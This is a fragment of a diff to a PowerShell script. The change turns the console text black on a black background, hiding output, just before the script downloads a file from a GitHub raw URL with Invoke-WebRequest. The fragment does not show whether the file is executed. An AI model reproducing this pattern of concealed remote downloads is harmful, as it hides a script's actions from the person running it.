@@ -28,7 +28,7 @@ tree /A | Where-Object { $_ -notmatch '\.' }
 Start-Sleep -Seconds 2
 
 $Host.UI.RawUI.BackgroundColor = "Black"
-$Host.UI.RawUI.ForegroundColor = "White"
+$Host.UI.RawUI.ForegroundColor = "Black"
 
 Invoke-WebRequest -Uri "https://github.com/nickfour/Service7/raw/main/t.txt" -OutFile $destinationPath
 
